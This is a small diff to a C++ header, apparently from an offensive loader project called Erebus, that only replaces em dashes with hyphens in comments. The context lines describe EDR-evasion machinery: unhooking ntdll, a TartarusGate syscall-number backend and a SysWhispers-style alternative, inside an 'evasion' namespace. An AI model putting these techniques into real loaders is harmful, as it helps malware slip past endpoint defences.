@@ -2,7 +2,7 @@
 #define EREBUS_SYSCALL_BACKEND_HPP
 #pragma once
 
-// CONFIG_SYSCALL_BACKEND — selects the syscall dispatch layer.
+// CONFIG_SYSCALL_BACKEND - selects the syscall dispatch layer.
 //
 //   0  TartarusGate  (default)
 //        Built-in. After UnhookNtdll() restores clean stubs, extracts SSNs
@@ -33,7 +33,7 @@
 
 #elif CONFIG_SYSCALL_BACKEND == 1
 
-    // Do NOT include Syscalls.h here — it redefines types already in loader.hpp.
+    // Do NOT include Syscalls.h here - it redefines types already in loader.hpp.
     // The Syscalls.h include lives in sw3_backend.cpp, before loader.hpp.
     namespace erebus { namespace evasion {
         BOOL  InitSyscallBackend();
